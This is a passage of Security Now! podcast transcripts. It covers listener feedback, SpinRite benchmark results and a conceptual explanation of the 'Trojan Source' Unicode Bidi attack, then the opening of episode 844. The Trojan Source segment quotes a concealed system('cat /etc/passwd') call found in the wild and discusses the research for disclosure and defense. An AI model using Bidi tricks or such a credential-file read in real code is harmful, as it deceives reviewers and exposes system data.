"Hello, Steve.  Just listened to the latest podcast."  He says, "I'm a bit late in listening this week.  And you probably already know about 'lasguns'" - okay, that's a thing, that's the official term, L-A-S-G-U-N - "lasguns in Dune."  And so I didn't know, so thank you, Dave.  "But there actually is an answer why they don't use them more often.  Turns out the interaction with the lasgun and shield" - that is, you know, the personal shields they all wear - "is catastrophic for everyone.  They mention this in the book, but never really mentioned it in the movie.  I've been a fan of 'Dune' for many, many years, and glad to finally see a movie that does the books some justice.  Can't wait until Part 2.  Only wish it was sooner.  Have a great day."



And he gave me a link in his tweet to a page, dune.fandom.com.  There's a wiki there, and there's a page on the lasgun where, I'm just excerpting from it, it explains:  "Lasguns were the preferred weapon for armies.  However, when shields were being employed, lasguns were generally not used because contact reaction between a lasgun beam and a shield created a nuclear explosion that often killed everyone within a large radius."  And it goes on:  "Many soldiers and assassins preferred knives and swords in combat, both because they safely penetrated personal shields, and because of newfound appreciation for the art of swordsmanship."



So all you "Dune" people out there, you probably knew that.  I didn't.  So I wanted to share it with the rest of us who also didn't know.  Makes sense.  And I do like when sci-fi imposes restrictions of that kind that you then need to work around, and they can often give you interesting plot vehicles that you wouldn't otherwise have.  Because if you can just blast people from a distance, that's not very sporting.  



JASON:  Yeah.  Not everybody has to love the laser, as much as all sci-fi seems to focus on.  I haven't seen the movie yet.  I don't know why.  But I need to see it.  I mean, literally everything that I ever hear anyone talk about it is like extremely positive.  So I'm waiting for the right time to see it with my wife.



STEVE:  It was extremely positive.  On the other hand, it was extremely half the story.



JASON:  Yeah, I keep hearing that, too.  It's like you want the rest.



STEVE:  And many people, I remember a friend of mine said he was looking at his watch, and it was like two hours and 15 minutes in, and he was thinking, how long is this movie?  And they still have a lot of ground to cover.



JASON:  Right.



STEVE:  And then it ended.



JASON:  There's no way they're rounding this out.



STEVE:  Yeah.  And then it was over.  He's like, what?  Wait, wait, what, huh?  So anyway, I will watch it again in two years when Part 2 is available.



JASON:  Yeah, yeah.



STEVE:  So that I can spend five hours of my day having the whole experience at once.  But, I mean, it sounds to me like maybe you could wait until Parts 1 and 2 are both available.



JASON:  Nah, I'm not going to be able to wait.  I'm going to have to watch it.



STEVE:  Well, for what it's worth, HBO Max, which co-released it because they had the deal with Warner Bros., it's only till the end of this month, I think.  I hope it wasn't the end of last month.  But it's a limited release streaming.  So if you want to not watch it in the theater, but get it from the comfort of your own couch, you can't do it in December.



JASON:  We've got to do it soon.



STEVE:  So maybe it'll be somewhere else, or maybe it'll be Pay Per View or something.  But, you know.



JASON:  Right.



STEVE:  For anybody else who didn't know that, it's only available for a limited time.



Peter G. Chase, he said:  "I'll be reading" - and this also refers to a grumbling that I had last week that I shared with Leo.  He said:  "I'll be reading a newsletter and get the overlay" - meaning over the screen - "asking me if I want to sign up for their newsletter.  Which is how I got to that page in the first place, because I'm signed up."  We were talking about how I'm noticing that many pages are now apparently monitoring the user's mouse.  And as you go to slide off the page up to the tab in order to close it, or maybe go to the back button, that seeing you about the leave, the screen will darken, and you'll get a, oh, before you leave, consider the following.  And it's like, ugh.  That is so annoying.  And it's like, let me leave.  Anyway, thank you, Peter.



JASON:  Don't like that.



STEVE:  And JD Ainsworth, he said - oh, and he explained another puzzle from last week.  "At Microsoft, PM is usually Project Manager or Program Manager, and S is either senior or Security."  So Leo and I were puzzling over a term in a Microsoft posting, the SPM.  You know, contact your SPM.  It's like, what the heck?  Anyway, he says:  "SPM is most likely Security Program Manager."  So JD, thanks for the clarification.



Last week, actually for several weeks, I had been talking about that everybody had the fourth prerelease of SpinRite, and I was working to get the fifth prerelease out to our testers.  That happened Sunday afternoon, two days ago, at around 4:00 p.m.  I posted SpinRite 6.1's fifth prerelease.  The gang who were waiting for it wasted no time copying the 55K DOS executable to their bootable thumb drives and taking it out for a spin.  They found the almost entirely rewritten benchmarking system with the new feature I had just added.  Once SpinRite has benchmarked a drive, which it's able to do very quickly, it estimates and displays the total time that will be required for SpinRite to perform a standard Level 2 analytical scan of that drive's entire storage space.



The best news that came out of this is how fast and practical 6.1 is turning out to be.  I have some numbers.  A 1TB Crucial SATA SSD, 1TB, can receive a SpinRite full Level 2 scan in 29.7 minutes.  Okay.  That's 1TB in half an hour.  As I've mentioned previously, I was originally hoping for 0.5TB per hour from the new SpinRite.  This is four times faster than that, which certainly sets a new land speed record for SpinRite.  A 256GB SATA SSD was scanned in 7.3 minutes; a 129GB Kingston SATA SSD in 3.7 minutes.  A spinning Seagate 6TB SATA drive took 9.27 hours.



Now, 9.27 hours, that's a while.  On the other hand, it's not 9.27 months, the way it might have been.  And that's 6TB.  That's a big drive.  You know, you don't format those anymore, right, like the way you used to, where you actually go out and look at the surface?  No.  You kind of can't format a big drive like that.  So pretty much SpinRite is the only way that surface is ever going to get seen is by running a drive that size on SpinRite.



I also had some old IDEs.  An old spinning 40GB Maxtor IDE with a parallel cable it was able to scan in 31.1 minutes.  An old 160GB Seagate IDE, also parallel cable, took 48.1 minutes.  So four times larger than that 40GB Maxtor, but a lot higher sector density, so a higher data rate.  So four times the drive size in, as opposed to 31 minutes, 48 minutes.  I had two drives on USB.  A 64GB SanDisk USB-attached thumb drive took 59 minutes, so just shy of an hour.  And a 1TB USB-attached solid state drive took 14, or is estimated to take 14.46 hours.



Now, yes, 14 hours for a terabyte on USB is way more than, what was it, 29 minutes for a terabyte on a SATA hooked to an AHCI controller.  As I've said before, we won't have SpinRite's new super-speed performance for USB, which by the way will match the other drives in performance, until 7.1, since I'm going to need to write USB drivers from scratch as I just have for IDE, ATA and AHCI controllers.  And since the next step will be to move SpinRite away from DOS over to its new 32-bit OS home, so that it will be able to boot on UEFI-only systems, which no longer have a BIOS, that means they no longer allow to DOS to boot, and that's where SpinRite lives today.  So I'm moving it over to the other OS.  So it was overall much more efficient to wait to add USB support until we're over on the new platform so that I'm not having to rewrite everything there.  But even 14.46 hours for a terabyte is significantly more practical than SpinRite has ever been before.



So anyway, aside from performing lots of fun benchmarks, although the fifth prerelease resolved a bunch of previous edge cases, it also revealed a few issues with specific hardware where I'll be spending some more time.  But overall, things are looking very good.  As a matter of fact, during the time before the podcast started, Jason, I was mulling over some of the feedback that I already had and wondering why really big drives were reporting an error that they shouldn't have reported.



And so I went into SpinRite source code before we began the podcast to at least answer for myself that question.  And I realized I had a kind of a typo where I had written Int 13 ext version; or rather, where I wanted to have Int 13 extensions, I had Int 13 ext version.  So I got the wrong variable name, which was testing a version number rather than some flags, which completely explains a large class of the feedback that I got.  So anyway, it's looking really good, and I'll fix those, and then we'll be moving forward again.  So just a word of thanks to everybody who's testing it for us.



JASON:  Right on.  All right.



STEVE:  We'll take our last break, and then we're going to talk about Trojan Source Code.



JASON:  That just rolls off the tongue right there.  Trojan Source.  What is Trojan Source?



STEVE:  So what's so cool about this is that everybody listening is going to be able to get this.  It's kind of like one of those "Oh, my god," like where it hadn't occurred to you, but then when you get it, it's like, oh, this could be bad.  And indeed, that's the other thing that is cool in a spooky way is, like, this could happen.  And I'll save the punch line for the end.



But a pair of researchers in the U.K. have been exceedingly clever.  They figured out an entirely practical and terrifyingly effective way of hiding malicious source code in plain sight; or, if not really in plain sight, then invisibly right in front of everyone else's eyes without being seen.  I have a link at the end of the show notes to their 15-page research paper, but I'll just share the abstract.  And I'm going to share some chunks of it because they do a good job of explaining this.



Their abstract reads:  "We present a new type of attack in which source code is maliciously encoded so that it appears different to a compiler than to the human eye.  This attack exploits subtleties in text-encoding standards such as Unicode to produce source code whose tokens are logically encoded in a different order from the one in which they're displayed, leading to vulnerabilities that cannot be perceived directly by human code reviewers."  In other words, you'd be like looking right at the source code, and what the compiler produces from what you're seeing is different from what you see.



They said:  "'Trojan Source' attacks, as we call them, pose an immediate threat" - and I agree - "both to first-party software and of supply-chain compromise across the industry.  We present working examples of Trojan Source attacks in C, C++, C#, JavaScript, Java, Rust, Go, and Python.  We propose definitive compiler-level defenses, and describe other mitigating controls that can be deployed in editors, repositories, and build pipelines while compilers are upgraded to block this attack."



Okay.  So what exactly have these clever guys come up with?  They introduce their ideas quite well, so I'm just going to share their introduction.  They said:  "What if it were possible to trick compilers into emitting binaries that did not match the logic visible in source code?  We demonstrate that this is not only possible for a broad class of modern compilers, but easily exploitable.  We show that subtleties of modern expressive text encodings, such as Unicode, can be used to craft source code that appears visually different to developers than to compilers.  The difference can be exploited to invisibly alter the logic in an application and introduce targeted vulnerabilities.



"The belief that trustworthy compilers emit binaries that correctly implement the algorithms defined in source code is a foundational assumption of software.  It's well-known that malicious compilers can produce binaries containing vulnerabilities.  As a result, there's been significant effort devoted to verifying compilers and mitigating their exploitable side effects.  However, to our knowledge, producing vulnerable binaries via unmodified compilers by manipulating the encoding of otherwise non-malicious source code has not so far been explored.



"Consider a supply-chain attacker," they say, "who seeks to inject vulnerabilities into software upstream of the ultimate targets, as happened in the recent Solar Winds incident.  Two methods an adversary may use to accomplish such a goal are suborning an insider to commit vulnerable code into software systems, or contributing subtle vulnerabilities into open-source projects.  In order to prevent or mitigate such attacks, it's essential for developers to perform at least one code or security review of every submitted contribution.  However, this critical control may be bypassed if the vulnerabilities do not appear in the source code displayed to the reviewer, but are hidden in the encoding layer underneath."



They say:  "Such an attack is quite feasible, as we will hereafter demonstrate.  In this paper, we make the following contributions.  We define a novel class of vulnerabilities, which we call 'Trojan Source attacks,' and which use maliciously encoded but semantically permissible source code modifications to introduce invisible software vulnerabilities.  We provide working examples of Trojan Source vulnerabilities in C, C++, C#, JavaScript, Java, Rust, Go, and Python.  We describe effective defenses that must be employed" - must be employed - "by compilers, as well as other defenses that can be used in editors, repositories, and build pipelines.  We document the coordinated disclosure process we use to disclose this vulnerability across the industry.  And we raise a new question about what it means for a compiler to be trustworthy."



Okay.  So how's this done?  We're familiar with how the expansive Unicode character set can be, and has been, used to create so-called "homograph attacks" using lookalike or closely alike characters in a domain name.  A user might click on a link, then look in their browser's URL field to verify where they are before proceeding to interact with that website.  But in a homograph attack, the domain they're actually on looks like PayPal, but it isn't.



Okay.  The way these guys formally state this is:  "Digital text is stored as an encoded sequence of numerical values, or code points, that correspond with visual glyphs according to the relevant specification.  While single-script specifications such as ASCII were historically prevalent, modern text encodings have standardized around Unicode.  At the time of writing, Unicode defines 143,859 characters across 154 different scripts, in addition to various non-script character sets, such as emojis, plus a plethora of control characters.  While its specification provides a mapping from numerical code points to characters, the binary representation of those code points is determined by which of various encodings is used, with one of the most common being UTF-8.



"Text rendering is performed by interpreting" - there's that word, an interpreter, remember, danger danger - "by interpreting encoded bytes as numerical code points according to the chosen encoding, then looking up the characters in the relevant specification, then resolving all control characters, and finally displaying the glyphs provided for each character in the chosen font."



Okay.  Now, not all languages, as I'm sure everyone knows, are read from left to right.  And Unicode's textual representation was designed to support all languages.  This means that there must be some means for controlling the reading direction, which is to say the visual glyph positioning, through Unicode.  In order to support left-to-right and right-to-left ordered languages, Unicode defines a set of nine control characters.  An example is RLE, that is, the single character has the abbreviation RLE, which stands for right-to-left embedding.  RLO stands for right-to-left override, for example.



And since these are locally modal, that is, it's like an escape character that sets the direction, how do you unset it?  It's necessary to have some way of undoing them.  So there's a, for example, PDF character which stands for Pop Directional Formatting, which literally is like popping the stack.  It restores the previous direction.  And in the definition it states for PDF states "terminates nearest LRE, RLE, LRO, or RLO."  So anyway, it means that Unicode rendering is an interpreter which is maintaining some state.



In explaining their attack methodology they write:  "Internationalized text encodings require support for both left-to-right languages such as English and Russian, and right-to-left languages such as Hebrew and Arabic.  When mixing scripts with different display orders, there must be a deterministic way to resolve conflicting directionality.  For Unicode, this is implemented in the Bidirectional, or Bidi, Algorithm.  In some scenarios," they write, "the default ordering set by the Bidi Algorithm may not be sufficient.  For these cases, override control characters are provided.  Bidi overrides are invisible characters that enable switching the display ordering of groups of characters."



Then in their paper they have a table of the nine different things.  And they say:  "The table provides a list of Bidi override characters relevant to the attack.  Of note are LRI and RLI, which format subsequent text as left-to-right and right-to-left respectively, and are both closed by PDI."  Which is, again, that pop.  Since our listeners cannot see the table, LRI stands for left-to-right isolate is the term they use, RLI for right-to-left isolate, and PDI for pop directional isolate.  Anyway, we'll get to "isolates" in a minute.



So they said:  "Bidi overrides enable even single-script characters to be displayed in an order different from their logical encoding.  This fact has previously been exploited to disguise the file extensions of malware disseminated by email and to craft adversarial examples for NLP machine-learning pipelines.  As an example, consider the following Unicode character sequence."  So then they have the Unicode character RLI, then a b c, then PDI, which pops that RLI effect.  And they say:  "...which will be displayed as."  So again it was RLI a b c PDI will be displayed as c b a.  They said:  "All Unicode Bidi overrides are restricted to affecting a single paragraph, as a newline character will explicitly close any unbalanced overrides, namely overrides that lack a corresponding closing character," or the proper number of pops.



Okay.  So the ability to reorder individual character sequences, to that we add one additional complexity which adds the ability to use tricky Unicode encodings, and that's those isolates I talked about before.  In the Bidi specification, isolates, sort of the way their name sounds, are groups of characters, you know, isolated, that are treated as a single entity, so grouped together.  Okay.  That is, the entire isolate will be moved as a block when the display order is overridden.  And moreover, isolates can be nested.



Okay.  So here's an example.  We have RLI, which starts a right-to-left isolate.  Then we have LRI, which starts a left-to-right isolate.  Then the letters "abc."  And then we pop the preceding RLI with a PDI character.  Now we start another isolate with an LRI, and we have "def."  And then we close that by popping it with a PDI.  And then we close that original RLI, which encloses the two internal LRIs with a final PDI.  So what was written there is "abc," and then "def," with all these various control characters bracketing them.  What will display is "defabc."  In other words, what you see is none of the control characters.  You see the def block preceding the abc block.  But the compiler, which ignores the Unicode control characters, sees the abc block followed by the def block.  In other words, using this trick it is possible to swap blocks of characters, and all compilers and languages currently fall to this.



Okay.  So by this point everyone gets it.  They write:  "Embedding multiple layers of LRI and RLI within each other enables the near-arbitrary reordering of strings.  This gives an adversary fine-grained control, so they can manipulate the display order of text into an anagram of its logically encoded order.  Like most non-text rendering systems, compilers and interpreters do not typically process formatting control characters, including Bidi overrides, prior to parsing source code.  This can be used to engineer a targeted gap between the visually rendered source code as seen by a human eye, and the raw bytes of the encoded source code as evaluated by a compiler.



"We can exploit this gap," they write, "to create adversarially encoded text that is understood differently by human reviewers than by compilers."  And they did it.  They pulled it off.  They successfully implemented invisible malicious changes to the source code of all those languages.  In their paper they take each language at a time and give examples of how these techniques can be used in the real world.



So we have a new, entirely viable, and attractive means of attacking the source code of pretty much everything.  This should worry us.  So I went looking for and found their discussion of who they told about this before they told all of us, and of course all the bad guys throughout the world.  They wrote:  "We contacted 19 independent companies and organizations in a coordinated disclosure effort to build defenses for affected compilers, interpreters, code editors, and code repository frontends.  We set a 99-day embargoed disclosure period during which disclosure recipients could implement defenses before we published our attacks.  We met a variety of responses ranging from patching commitments and bug bounties to quick dismissal and references to legal policies.



"We selected an initial set of disclosure recipients by identifying the maintainers of products that our experiments indicated were affected by the Trojan Source vulnerability pattern.  We also included companies that, to our knowledge, maintain their own internal compilers and build tools.  The initial disclosures were sent on July 25th, 2021.  Several of the initial recipients asked us to include additional organizations in the disclosure process, and we did so.  We also sent additional disclosure throughout the embargo window for affected products that we discovered during the disclosure process.



"Of the 19 software suppliers with whom we engaged, seven used an outsourced platform for receiving vulnerability disclosures, six had dedicated web portals for vulnerability disclosures, four accepted disclosures via PGP-encrypted email, and two accepted disclosures only via non-PGP email.  They all confirmed receipt of our disclosure, and ultimately nine of them committed to releasing a patch."  Okay, nine out of 19.  "Eleven of the recipients had bug bounty programs offering payment for vulnerability disclosures.  Of these, five paid bounties, with an average payment of $2,246.40 and a range of $4,475."  Doesn't seem like very much money for this research.  This is serious.



"On September 9th, 2021 we sent a vulnerability report to CERT Coordination Center sponsored by CISA.  Our report was accepted the same day for coordinated disclosure assistance.  This gave all affected vendors access to VINCE, a tool providing a shared communication platform across vendors implementing defenses.  Thirteen of our recipients, inclusive of CERT, opted in to the VINCE tool for these shared communications.  CERT also added three additional vendors to the disclosure beyond the 19 we had already contacted."  On October 18th, Trojan Source attacks were issued two CVEs for tracking the Bidi attack and for tracking the homoglyph attack.  They noted that it's also possible to fool that way.  These CVEs were issued by MITRE against the Unicode specification.



"On the same day, we sent a PGP-encrypted disclosure to the distros mailing list, which contains representatives of the security teams of 21 operating systems as of the time of this writing.  The list coordinates the application of patches across OS maintainers, but allows a maximum embargo period of 14 days."



Okay.  And finally, this.  "We were curious," they wrote, "if we could find any examples of Trojan Source attacks in the wild prior to public disclosure of the attack vector, and therefore tried to scan as much of the open source ecosystem as we could for signs of the attack.  We assembled a regex that identified unterminated Bidi override sequences in comments and strings, and GitHub provided us with the results of this pattern run against all public commits containing non-markup language source code ingested into GitHub from January through mid-October 2021.  This yielded 7,444 commits, which resolved to 2,096 unique files still present in public repositories as of October '21.



"The majority of the results were false positives.  Examples of clearly non-malicious encodings included LRE characters placed at the start of the file paths" - you know, left-to-right encoding, and they already were left-to-right encoded - "malformed strings in genuinely right-to-left languages, and Bidi characters placed into localized format string patterns.



However, we did find some evidence of techniques similar to Trojan Source attacks being exploited.  In one instance, a static code analysis tool for smart contracts, Slither, contained scanning for right-to-left override characters.  The tool provides an example of why this scan is necessary.  It uses the RLO character to swap the display order of two single-character variables passed as arguments.  In another instance, we discovered the use of RLI and LRI characters used to conceal an invocation of system('cat /etc/passwd') within a Ruby script."



In other words, dumping the passwords file.  In other words, these techniques had already occurred to someone and had already been under exploitation in the field.  Not widely, but then neither was their scan that wide.  They also have some very good thoughts about the implementation of defenses for this class of attacks.



They said:  "The simplest defense is to ban the use of text directionality control characters both in language specifications and in compilers implementing these languages.  In most settings, this simple solution may well be sufficient.  If an application wishes to print text that requires Bidi overrides, developers can generate those characters using escape sequences, rather than embedding potentially dangerous characters into source code.  This simple defense can be improved by adding a small amount of nuance.  By banning all directionality-control characters, users with legitimate Bidi-override use cases in comments are penalized.  Therefore, a better defense might be to ban the use of unterminated Bidi override characters within string literals and comments.  By ensuring that each override is terminated - that is, for example, that every LRI has a matching PDI - it becomes impossible to distort legitimate source code outside of string literals and comments."



And they go on.  Basically they identified something that occurred to them as something nobody had ever thought of.  They fully implemented exploits in a handful of languages.  They quietly told everybody who might be affected that, hey, pay attention.  This is real.  This is bad.  Half the people understood; the other half are idiots who said, you know, call our attorney.  And good luck to them because I guarantee you this is going to, you know, bad guys are going to jump on this, now that this is public, and look for places where this can be leveraged.  I really, really hope that the industry had time to bring up its defenses and prepare for this because this is going to slip under an awful lot of radar.  Anyway, Trojan Source.  I thought it was very cool.



JASON:  That's fascinating.  Yeah, that's some pretty intense stuff there.



STEVE:  Yeah.



JASON:  Right on.  Well, excellent stuff, excellent work, Steve.  Always appreciate your deep dives on this stuff.  I will admit there were a lot of letters flying by there for a second.  If I wasn't looking at what you were reading, it was really hard to follow along.  But that's a complicated thing, and appreciate you breaking it down for us, as you do each and every week.



Steve is awesome.  If you want to check out everything that Steve's up to, go to GRC.com.  All of Steve's goodness, from SpinRite, of course, to SQRL.  Information about SQRL can be found there.  You can find audio and video of this show there, as well as transcripts.  It's the only place where you can find transcripts for Security Now!, even.



And then of course our website, TWiT.tv/sn for Security Now!.  And you can find the audio and video there, as well as all the links that you need to subscribe to the feeds, even on YouTube.  You can jump out to YouTube and do it there.  It's all listed.  And we do record this show live every Tuesday.  So if you want to tune in to that, that's not a problem, as well.  TWiT.tv/live, 1:30 p.m. Pacific, 4:30 p.m. Eastern, 20:30 UTC.  I had to look that up, so I think it's right, at least for one more week.  Things are going to change next weekend.  So we'll have to prepare Leo for that.



But speaking of Leo, Leo will be back in the hot seat next week with you, Steve.  So everybody can look forward to having him back then, and look forward to seeing you, too, as we do each and every week on Security Now!.  And thank you for allowing me to crash the party for a week again.



STEVE:  Oh.  Allowing you?  Thank you for keeping it going.  Great to see you, Jason.  



JASON:  Thank you, Steve.  Thanks to everybody.  Great to see you, too.  We'll see you next time on Security Now!.  Bye, everybody.



STEVE:  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#844

DATE:		November 9, 2021

TITLE:		Bluetooth Fingerprinting 

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-844.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we quickly cover a bunch of welcome news on the combating ransomware front.  We look at the results from last week's Pwn2Own contest in Austin Texas, and at a weird problem that only some users of Windows 11 started experiencing after Halloween.  There's a serious problem with GitLab servers and additional supply-chain attacks on JavaScript's package management.  Google fixed a bunch of things in Android last Tuesday, and Cisco has issued an emergency CVSS 9.8 alert, and U.S. federal agencies are being ordered to patch hundreds of outstanding vulnerabilities.  We have some fun closing-the-loop feedback from our listeners.  I'm going to share the details of an interesting IRQ problem I tracked down last week.  Then we'll take a look at an aspect of radio frequency fingerprinting that has apparently escaped everyone's notice until seven researchers from UCSD did the math. 



SHOW TEASE:  It's time for Security Now!'s 50th anniversary of a very important technology innovation.  Steve and I will chat back and forth, some memories.  Also I guess the headline of this show should be "Got 'em."  Looks like they have captured some of the principals in one of the worst ransomware gangs of all time.  And then Steve talks about an interesting research that shows that your Bluetoothed phone is basically announcing your presence at all times to anyone who asks.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 844, recorded Tuesday, November 9th, 2021:  Bluetooth Fingerprinting.



It's time for Security Now!, the show where we cover your security and privacy online with Mr. Steven "Tiberius" Gibson of GRC.com.  First of all, hi, Steve.  I didn't want you to have to sit there with your Vulcan salute for too long.  You could get a cramp.  I also want to thank Mikah for filling in.  Did Mikah do the show?



STEVE GIBSON:  Jason.



LEO:  Jason did.  All right.



STEVE:  Yup.



LEO:  Jason for filling in last week.  Did a wonderful job.  I hear there was a bit of a rant.



STEVE:  Oh.



LEO:  I'm sorry I missed that.  Always enjoy those.



STEVE:  No, you're not.  No, you're not sorry.



LEO:  No?  No?



STEVE:  Well, I mean, I started out by mentioning that I was self-conscious about having been ranting and so hard on Microsoft recently.  And then I just completely jumped the shark.  I just...



LEO:  That's why we love you.



STEVE:  At least, the only thing I can say in my defense is that it's not a put-on; right?  I mean, a lot of these guys who do that are just - it's a put-on.  But I just - it's real.  So, and actually we have some feedback from our listeners which demonstrates the degree to which they have come to know who their Security Now! host is we'll be getting to.  But we have a great Episode 844 for this second week of - where are we?  November, with the daylight savings having changed.  



LEO:  It's a question I ask every day.  Where are we?



STEVE:  Where are we?



LEO:  Where the hell are we?



STEVE:  So, well, and in your case it actually may have a different answer.  I never go anywhere.  But I'm happy to be here.  We're going to talk about Bluetooth fingerprinting, something which is different in an interesting way than we've ever addressed before because it's not fingerprinting the digital information that's all been deeply crypto-ized.  It's the analog information.  It turns out not all Bluetooth radios are created the same.  In fact, no two are created the same.  And that leads to some interesting problems.  But we're going to talk about, as you have already been, but we have to cover it here, a bunch of welcome news on the combating ransomware front.  We're going to look at the results from last week's always entertaining Pwn2Own contest, which took place in Austin, Texas.  And at a weird problem that only some users of Windows 11 started experiencing after Halloween.  Go figure.



There's a serious problem with GitLab servers, and additional supply chain attacks on JavaScript's package management.  Google fixed a bunch of things in Android last Tuesday, and Cisco has issued an emergency CVSS 9.8 which, you know, it only goes to 10.  So that's - and I don't think I've ever seen anything other than 9.8.  They must be reserving 9.9 and 10 for, like, end of the Internet scale, you know, a so-called ELE, right, an Extinction Level Event.  Also U.S. federal agencies are being ordered to patch hundreds of outstanding vulnerabilities, and you won't believe by when.  We have some fun, as I said, closing-the-loop feedback from our listeners.



I'm going to share I think what our listeners will find some interesting details of an IRQ problem I tracked down last week.  The old-timers here will remember those horrible days of IRQs on the ISA bus back in the early PC and XT days.  Then we're going to look at an aspect of radio frequency fingerprinting that has apparently escaped everyone's notice until seven researchers from UCSD did the math.  And we have a really cool Picture of the Week that I just wanted to sort of take a moment to acknowledge.



LEO:  Yeah, I agree.



STEVE:  So I think another great podcast for our listeners.  Well, and in fact the inheritor of this anniversary, of course, is a very popular OS that you yourself are in favor of.



LEO:  Familiar with, yes, yes.  And we should mention, nice new glasses.



STEVE:  Oh.



LEO:  Yeah.



STEVE:  I'm surprised anyone noticed.



LEO:  Oh, no, they're very distinctive.



STEVE:  Well, I was looking at Alex because I'm sort of conscious of them.  They're huge.



LEO:  I like them.  They're big.  They're a little large, yeah.



STEVE:  Well, and I was actually sitting at a different location in my home where I have a different set of hardware set up to test SpinRite.  And I had a keyboard, like two drawers pulled out, and the keyboard was sitting on these drawers.  And I thought, okay, let's just go to a different keyboard.  So I put that keyboard down, the drawers were out, and I saw all of the previous pairs of glasses that...



LEO:  You found your glasses drawer.



STEVE:  I found my glasses drawer.  And I thought, huh, I wonder if any of those cases are not empty.  And the first one I opened had these, and they're actually a better prescription now for me than the ones I was wearing.



LEO:  Wait, wait.  So these aren't new.  They're old.



STEVE:  They're old, yeah.



LEO:  That's funny.



STEVE:  And I just sort of put them on, and I thought, oh, I can see better with these.  So I think maybe I'll wear them for a while.



LEO:  I think you should wear a different pair every day from now on and throw everybody.



STEVE:  And what I was noticing was Alex's glasses are like, you know, the size of dimes on him.



LEO:  Yeah, that's hipster.  That's the hipster thing.



STEVE:  Okay, well, I am the reverse.  We all know that already.  I am the reverse of - yeah.



LEO:  Do you have aviator, any aviator glasses in that drawer?  Because I think you'd look good with aviator.  In fact, doesn't  our art - I think our artwork has aviator glasses, actually.



STEVE:  That artwork is not good either.



LEO:  I know, you don't like it at all.



STEVE:  That's Snooty Steve.



LEO:  Yeah, your nose is a little bit in the air.  



STEVE:  You're lucky to be here.



LEO:  Let me just run over to the TWiT Store and see what glasses Snooty Steve - oh, you're not wearing any glasses in that one.  Okay.  So that's...



STEVE:  Oh, thank goodness.



LEO:  Yeah, yeah.  So it's snooty, but glasses-free.  That's, by the way, one of the best...



STEVE:  Apparently way down at the bottom of the page.



LEO:  I don't know why because it's one of our best-sellers.  I don't know why that wouldn't be at the very tippity-top.



STEVE:  Well, you put the ones that people want all the way at the bottom, Leo.  That way they're forced to scroll through.



LEO:  Oh.



STEVE:  Is that underwear?  



LEO:  It looks like a jockstrap; but it's not, it's a face mask.



STEVE:  Oh, thank goodness.  Okay.



LEO:  Yeah.  Yeah.  Why don't we have a Gibson face mask?  That's what we really need.



STEVE:  Oh, that's all right.



LEO:  Well, anyway.  TWiT.tv/store.



STEVE:  Don't want to scare the children.  Halloween is over.



LEO:  Yeah.  There it is.  There's the Security Now! mug.  I was just - I was looking at the wrong side.  There it is.  And you see no glasses, just a really snooty expression.  Whoops.  I hit too many...



STEVE:  Well, you know, I only started - I took my contacts out  shortly after I - I don't know, I don't think there was any reason, but Lorrie never knew me with contacts.  Everyone else did.  And so it was only about four or five years ago that I stopped wearing the contacts.  Because I'd worn them since I was in high school.  I asked my best friend, we were driving in his parents' car, and I said, "So what do you think about contacts?"  He says, "Oh, definitely."  He was like, didn't even - not even a hesitation.



LEO:  Oh, yes, definitely, Steve.



STEVE:  Okay, tell me what you really think, Scott.



LEO:  You need them.  No, no.  I like any look you come up with.  It's what's inside the noggin that matters.



STEVE:  We've got a lot of glass here now, so that's good.



LEO:  You said there's a big anniversary.



STEVE:  There is.  But first I want to note you have a little SQRL logo behind you.



LEO:  Oh, you didn't notice that.  Yeah, that's been there for ages.



STEVE:  Ah, I just saw it for the first time.



LEO:  It's carved in wood.



STEVE:  Very nice.



LEO:  I think, I'm trying to remember, was it Don [Name] who did that?  I can't remember.  He's our woodworker.  But, yeah, isn't that nice?  



STEVE:  Huh.  Very cool.



LEO:  Yeah.



STEVE:  It is nice.



LEO:  Yeah.



STEVE:  So yes, a big anniversary.  Well, yeah, it is big for the industry because of what's happened.  Last Wednesday, November 3rd, was to whatever degree it's possible to identify a specific date, and in fact this date comes from the cover page of the Unix Programmer's Manual.  And, you know, the people behind this are just - they're legends in the industry.  This page just says K. Thompson.  Well, we know that's Ken; right?  Because like I said, legends.  And D.M. Ritchie, well, that's Dennis.  So it was 50 years ago that someone typed, clearly on a typewriter, "Unix Programmer's Manual, K. Thompson, D.M. Ritchie, November 3, 1971."



And that was the first edition of Unix.  It ran on a PDP-11/20, which was not a big PDP-11.  They got much bigger after that.  This PDP-11, the target platform was a PDP-11/20 with 8K words.  It was a 16-bit, the PDP-11s are 16-bit machines.  So 8K words, in other words, 16K bytes of RAM, and that was the OS, and still left over plenty of room to actually run programs.  So yep, those were the days when operating systems were, you know, the first Unix was written by hand in assembler.  And I'm not exactly sure how C came along.



LEO:  Yeah, I think they wrote C for it; right?



STEVE:  Yeah.  But it might have been, I'm sure that the very first one was assembler.  So maybe they recoded a later version in C.  But then of course it absolutely was like the first major project written in C.  And just a beautiful piece of work.  Someone on Twitter who I may have thanked him for pointing that out to me, and he wrote back, and he said, "Hey, I know you've always been talking about PDP-8s, and you were active back then.  You've never talked about Unix in those days."



And of course the problem was it wasn't available to hobbyists.  This work was done at Bell Labs.  And so it ended up being inherited, the license to Unix, by AT&T.  And AT&T kept it as like a proprietary property for a long time.  And in fact it was probably, I didn't check the history, but I would imagine it was Unix's proprietary nature that was one of the incentives for Linus Torvalds to say, "Hey, you know, that's a great OS, but no one can get it.  So I'm going to write one."  Which is very much  the same philosophy as Unix, but open source and available to everyone.  And as a consequence, we have a very mature Linux operating system.



And then there were some recodings also, like for example one of the licensees of AT&T's Unix was University of California Berkeley.  They created their own BSD Unix, which was also licensed to the Regents of the State of California.  And then a free recoding of the Berkeley BSD was done to create FreeBSD.  So, I mean, there's been lots of forks and branches.  In fact, I remember seeing a tree, I'm sure you've see it, too, Leo, back in the day, of sort of the genealogy tree of these operating systems, how they branched off of each other and what was related to what and what came first and second.



LEO:  It's a pretty complicated tree, too.



STEVE:  It's a mess, yeah.



